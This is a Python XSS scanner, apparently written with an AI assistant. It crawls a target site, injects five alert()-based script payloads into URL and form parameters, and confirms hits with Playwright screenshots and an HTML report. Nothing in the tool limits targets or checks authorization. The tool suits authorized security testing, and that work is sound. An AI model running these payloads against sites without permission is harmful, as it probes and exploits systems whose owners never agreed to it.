#!/usr/bin/env python3
"""
Simple Popup XSS Scanner - Fixed Version
Only takes screenshot when YOUR popup is displayed
Author: AI Assistant
Version: 18.0 Simple
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
import base64
import html
import signal
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
import datetime

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class SimplePopupScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Data structures
        self.confirmed_vulnerabilities = []
        self.lock = threading.Lock()
        
        # Browser for validation
        self.browser = None
        self.playwright = None
        self.browser_context = None
        self.current_page = None
        
        # Enhanced payloads
        self.payloads = [
            '<script>alert("XSS_CONFIRMED")</script>',
            '<img src=x onerror=alert("XSS_CONFIRMED")>',
            '<svg onload=alert("XSS_CONFIRMED")>',
            '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
            '<body onload=alert("XSS_CONFIRMED")>'
        ]
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
        
        # Safe exit handling
        self.running = True
        signal.signal(signal.SIGINT, self._safe_exit)
        signal.signal(signal.SIGTERM, self._safe_exit)
    
    def _safe_exit(self, signum, frame):
        """Safe exit handler"""
        self.log("🛑 Safe exit requested...", "WARNING")
        self.running = False
        self._close_browser()
        self.log("✅ Safe exit completed", "SUCCESS")
        sys.exit(0)
    
    def log(self, message, level="INFO"):
        """Enhanced logging with better colors"""
        colors = {
            "INFO": Fore.WHITE,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.GREEN + Style.BRIGHT,
            "PHASE": Fore.CYAN + Style.BRIGHT,
            "TEST": Fore.WHITE,
            "SCORE": Fore.GREEN + Style.BRIGHT,
            "PARAM": Fore.CYAN,
            "PAYLOAD": Fore.MAGENTA,
            "ALERT": Fore.RED + Style.BRIGHT,
            "BROWSER": Fore.BLUE + Style.BRIGHT,
            "SCREENSHOT": Fore.CYAN + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def phase1_simple_reconnaissance(self):
        """Simple but effective reconnaissance"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 1: SIMPLE RECONNAISSANCE", "PHASE")
        self.log("=" * 80, "PHASE")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Parse the main page
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract URLs
            discovered_urls = set()
            discovered_urls.add(self.target_url)
            
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href and not href.startswith('#') and not href.startswith('javascript:'):
                    full_url = urljoin(self.target_url, href)
                    parsed = urlparse(full_url)
                    base_domain = urlparse(self.target_url).netloc
                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                        discovered_urls.add(full_url)
            
            # Extract forms
            all_forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'url': self.target_url,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                    }
                    form_data['inputs'].append(input_data)
                
                if form_data['action']:
                    form_data['action'] = urljoin(self.target_url, form_data['action'])
                else:
                    form_data['action'] = self.target_url
                
                all_forms.append(form_data)
            
            # Extract URL parameters
            all_url_params = set()
            for url in discovered_urls:
                parsed_url = urlparse(url)
                url_params = set(parse_qs(parsed_url.query).keys())
                all_url_params.update(url_params)
            
            # Extract form parameters
            all_form_params = set()
            for form in all_forms:
                for input_field in form['inputs']:
                    if input_field['name']:
                        all_form_params.add(input_field['name'])
            
            self.log(f"Discovered {len(discovered_urls)} URLs", "SUCCESS")
            self.log(f"Found {len(all_forms)} forms", "SUCCESS")
            
            # Display discovered parameters
            self.log("=" * 50, "PARAM")
            self.log("DISCOVERED PARAMETERS FOR TESTING", "PARAM")
            self.log("=" * 50, "PARAM")
            
            if all_url_params:
                self.log(f"URL Parameters ({len(all_url_params)}):", "PARAM")
                for param in sorted(all_url_params):
                    self.log(f"  • {param}", "PARAM")
            
            if all_form_params:
                self.log(f"Form Parameters ({len(all_form_params)}):", "PARAM")
                for param in sorted(all_form_params):
                    self.log(f"  • {param}", "PARAM")
            
            self.log("=" * 50, "PARAM")
            
            return {
                'urls': list(discovered_urls),
                'forms': all_forms,
                'url_params': list(all_url_params),
                'form_params': list(all_form_params)
            }
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def phase2_simple_popup_validation(self, recon_data):
        """Simple popup validation"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 2: SIMPLE POPUP VALIDATION", "PHASE")
        self.log("=" * 80, "PHASE")
        
        if not PLAYWRIGHT_AVAILABLE:
            self.log("Playwright not available, skipping browser validation", "WARNING")
            return
        
        if not self._init_browser():
            self.log("Browser initialization failed", "ERROR")
            return
        
        try:
            self.log("🌐 Browser initialized", "BROWSER")
            self._test_all_parameters_simple_popup(recon_data)
        finally:
            self._close_browser()
    
    def _init_browser(self):
        """Initialize browser"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,  # Show browser for live demonstration
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            self.browser_context = self.browser.new_context()
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser safely"""
        try:
            if self.browser_context:
                self.browser_context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
            self.log("🔒 Browser closed safely", "BROWSER")
        except Exception as e:
            self.log(f"Browser close error: {str(e)}", "ERROR")
    
    def _test_all_parameters_simple_popup(self, recon_data):
        """Test parameters with simple popup screenshot"""
        # Test URL parameters
        for url in recon_data['urls']:
            if not self.running:
                break
            self._test_url_parameters_simple_popup(url)
        
        # Test form parameters
        for form in recon_data['forms']:
            if not self.running:
                break
            self._test_form_parameters_simple_popup(form)
    
    def _test_url_parameters_simple_popup(self, url):
        """Test URL parameters with simple popup screenshot"""
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        
        for param_name in url_params:
            if not self.running:
                break
            self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
            
            for payload in self.payloads:
                if not self.running:
                    break
                self.log(f"  Payload: {payload}", "PAYLOAD")
                
                success = self._validate_xss_simple_popup(url, None, payload, param_name)
                if success:
                    break
    
    def _test_form_parameters_simple_popup(self, form):
        """Test form parameters with simple popup screenshot"""
        for input_field in form['inputs']:
            if not self.running:
                break
            if input_field['name']:
                self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                
                for payload in self.payloads:
                    if not self.running:
                        break
                    self.log(f"  Payload: {payload}", "PAYLOAD")
                    
                    form_data = {}
                    for field in form['inputs']:
                        if field['name'] == input_field['name']:
                            form_data[field['name']] = payload
                        else:
                            form_data[field['name']] = field['value']
                    
                    success = self._validate_xss_simple_popup(form['action'], form_data, payload, input_field['name'])
                    if success:
                        break
    
    def _validate_xss_simple_popup(self, url, form_data, payload, param_name):
        """Simple popup validation - ONLY takes screenshot when YOUR popup is displayed"""
        try:
            # Create a new page for this test
            test_page = self.browser_context.new_page()
            
            # Set up dialog handler for THIS specific test
            dialog_handled = False
            alert_message = ""
            screenshot_path = None
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message, screenshot_path
                try:
                    dialog_handled = True
                    alert_message = dialog.message
                    
                    self.log(f"  🚨 ALERT DETECTED: {dialog.message}", "ALERT")
                    
                    # CRITICAL: Only take screenshot if it's YOUR specific popup
                    if "XSS_CONFIRMED" in dialog.message:
                        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"popup_xss_{param_name}_{timestamp}.png"
                        screenshot_path = os.path.join('screenshots', filename)
                        
                        try:
                            # Take screenshot immediately when YOUR popup appears
                            test_page.screenshot(path=screenshot_path, full_page=True, timeout=3000)
                            self.log(f"  📸 YOUR POPUP SCREENSHOT CAPTURED: {screenshot_path}", "SCREENSHOT")
                        except Exception as e:
                            self.log(f"  ❌ Screenshot error: {str(e)}", "ERROR")
                            screenshot_path = None
                    
                    # Wait to see the popup clearly
                    time.sleep(1)
                    
                    # Accept dialog
                    try:
                        dialog.accept()
                    except Exception as e:
                        self.log(f"  ⚠️ Dialog accept error: {str(e)}", "WARNING")
                        
                except Exception as e:
                    self.log(f"  ❌ Dialog handler error: {str(e)}", "ERROR")
            
            # Set up dialog handler for this test page
            test_page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                test_page.goto(url, wait_until="domcontentloaded", timeout=30000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        test_page.fill(f'[name="{field_name}"]', str(field_value))
                    except:
                        continue
                
                # Submit form
                try:
                    test_page.click('input[type="submit"], button[type="submit"], button')
                except:
                    pass
                
                test_page.wait_for_load_state("domcontentloaded", timeout=30000)
            else:
                # Direct URL
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                test_page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
            
            # Wait for XSS execution
            time.sleep(3)
            
            # Check if XSS was triggered with YOUR popup
            if dialog_handled and "XSS_CONFIRMED" in alert_message:
                # Calculate professional score
                vuln_data = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': 'html',
                    'screenshot': screenshot_path,
                    'timestamp': datetime.datetime.now().isoformat(),
                    'alert_message': alert_message,
                    'confirmed': True,
                    'popup_screenshot': screenshot_path is not None
                }
                
                with self.lock:
                    self.confirmed_vulnerabilities.append(vuln_data)
                    self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    if vuln_data['screenshot']:
                        self.log(f"YOUR POPUP Screenshot: {vuln_data['screenshot']}", "VULN")
                    if vuln_data['popup_screenshot']:
                        self.log(f"YOUR POPUP Screenshot: ✅ Captured Successfully", "SCREENSHOT")
                
                # Close test page
                test_page.close()
                return True
            
            # Close test page if no XSS found
            test_page.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            try:
                test_page.close()
            except:
                pass
            return False
    
    def generate_simple_popup_report(self):
        """Generate simple popup HTML report"""
        self.log("Generating simple popup report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'simple_popup_report_{timestamp}.html')
        
        # Calculate statistics
        total_vulns = len(self.confirmed_vulnerabilities)
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Simple Popup XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; }}
        .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
        .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; }}
        .payload-display {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }}
        .alert-info {{ background: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #2196f3; }}
        .popup-screenshot {{ border: 3px solid #ff6b6b; box-shadow: 0 0 20px rgba(255, 107, 107, 0.3); }}
        .popup-badge {{ background: #ff6b6b; color: white; padding: 3px 8px; border-radius: 10px; font-size: 0.8em; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Simple Popup XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total_vulns}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat">
                <div class="stat-number">{popup_screenshots}</div>
                <div>YOUR Popup Screenshots</div>
            </div>
        </div>
        
        <div style="padding: 30px;">
            <h2>🎯 Vulnerability Details</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                html_content += f"""
                <div class="vulnerability">
                    <h3>🔍 Vulnerability #{i} 
                        {f'<span class="popup-badge">YOUR POPUP SCREENSHOT</span>' if vuln.get('popup_screenshot', False) else ''}
                    </h3>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload-display">{html.escape(vuln['payload'])}</div>
                    <div class="alert-info">
                        <strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}
                    </div>
                    <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="YOUR XSS Popup Screenshot" class="screenshot popup-screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Simple popup report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method with safe exit"""
        start_time = time.time()
        
        self.log("🚀 Starting Simple Popup XSS Scanner v18.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("Press Ctrl+C for safe exit", "INFO")
        self.log("🎯 ONLY takes screenshots when YOUR popup is displayed!", "SCREENSHOT")
        
        try:
            # Phase 1: Simple reconnaissance
            recon_data = self.phase1_simple_reconnaissance()
            if not recon_data or not self.running:
                return
            
            # Phase 2: Simple popup validation
            self.phase2_simple_popup_validation(recon_data)
            
            # Generate report
            if self.running:
                report_path = self.generate_simple_popup_report()
                
                # Show results
                self._show_final_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except KeyboardInterrupt:
            self.log("🛑 Scan interrupted by user", "WARNING")
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
        finally:
            self._close_browser()
    
    def _show_final_results(self, report_path):
        """Show final results"""
        self.log("=" * 80, "PHASE")
        self.log("SCAN RESULTS", "PHASE")
        self.log("=" * 80, "PHASE")
        
        total_vulns = len(self.confirmed_vulnerabilities)
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        self.log(f"YOUR Popup screenshots: {popup_screenshots}", "SCREENSHOT")
        
        if report_path:
            self.log(f"📊 Simple Popup Report: {report_path}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Simple Popup XSS Scanner v18.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = SimplePopupScanner(args.url, args.timeout)
    scanner.scan()

if __name__ == "__main__":
    main()